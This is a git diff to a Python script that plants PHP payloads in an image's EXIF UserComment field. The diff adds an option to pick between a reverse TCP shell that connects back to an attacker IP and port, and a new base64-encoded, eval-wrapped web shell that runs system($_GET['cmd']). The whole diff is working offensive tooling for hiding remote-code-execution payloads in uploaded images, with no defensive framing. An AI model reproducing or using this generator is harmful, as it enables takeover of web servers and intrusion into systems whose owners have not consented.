@@ -16,6 +16,7 @@ requiredArgs.add_argument("-a", "--ipaddr", type=str, default="", metavar="", he
 optionalArgs = parser.add_argument_group("Optional Arguments")
 optionalArgs.add_argument("-p", "--port", type=int, default=21, metavar="", help="Port [default:21]")
 optionalArgs.add_argument("-o", "--outfilename", type=str, default="", metavar="", help="Use a Different Name to Original Image")
+optionalArgs.add_argument("-t", "--type", type=int, choices=range(1,3), default=1, metavar="", help="Type of Exploit to Use (1 = CMD Shell, 2 = Reverse TCP Shell)")
 optionalArgs.add_argument("-h", "--help", action="store_true", help="Show Help")
 args = parser.parse_args()
 
@@ -33,15 +34,21 @@ def show_help(msg = ""):
     print("Optional Arguments")
     print("------------------------------------------------")
     print("-p,  --port         Attacker Port [default:21]")
+    print("-t   --type         Shell Type (1 = CMD Shell, 2 = Reverse TCP Shell)[default:1]")
     print("-o,  --outfilename  Use a Different Name to Original Image")
     print("-h,  --help         Show Help")
     print("------------------------------------------------")
     print("\n")
     print("Syntax")
     print("------------------------------------------------------------------------------------------------------------------------------")
+    print("Reverse TCP Shell")
     print("python3 PHPReverseShell2ImageExif.py --image=\"image.jpeg\" --ipaddr\"<IP>\" --port\"<PORT>\" --outfilename\"newimage.jpg\"")
     print("python3 PHPReverseShell2ImageExif.py --image=\"image.jpeg\" --ipaddr\"<IP>\" --port\"<PORT>\"")
     print("python3 PHPReverseShell2ImageExif.py --image=\"image.jpeg\" --ipaddr\"<IP>\"")
+    print("------------------------------------------------------------------------------------------------------------------------------\n")
+    print("CMD Shell")
+    print("python3 PHPReverseShell2ImageExif.py --image=\"image.jpeg\" --type=[default:1] --outfilename\"newimage.jpg\"")
+    print("python3 PHPReverseShell2ImageExif.py --image=\"image.jpeg\" --type=[default:1]")
     print("------------------------------------------------------------------------------------------------------------------------------\n")
     sys.exit()
 
@@ -49,11 +56,11 @@ def show_help(msg = ""):
 if(args.help):
     show_help() 
 
-if(args.image == "" or args.ipaddr == ""):
+if(args.image == "" or (args.type == 2 and args.ipaddr == "")):
     show_help("Error missing arguments!")
 
 
-def build_exploit_string(ipaddr, port):
+def build_reverse_tcp_exploit_string(ipaddr, port):
     exploit = """
         if (($f = 'stream_socket_client') && is_callable($f)) {     
             $s = $f("tcp://{$ip}:{$port}");       
@@ -118,9 +125,22 @@ def build_exploit_string(ipaddr, port):
     return string.encode()
 
 
+def build_shell_exploit_string():
+    exploitString = "echo '<pre>'; system($_GET['cmd']);"
+    encoded = base64.standard_b64encode(bytes(exploitString, 'UTF-8')).decode("UTF-8")
+    string = "<?php $encoded='" + encoded + "'; $unencoded=base64_decode($encoded); eval($unencoded); ?>"
+    return string.encode()
+
+
 # Build and add exploit to the UserComment Exif Data
+if(args.type == 2):
+    exploit = build_reverse_tcp_exploit_string(args.ipaddr, args.port)
+else:
+    exploit = build_shell_exploit_string()
+
+
 exif_ifd = {
-    piexif.ExifIFD.UserComment: build_exploit_string(args.ipaddr, args.port)
+    piexif.ExifIFD.UserComment: exploit
 }
 exif_dict = {"Exif":exif_ifd}
 
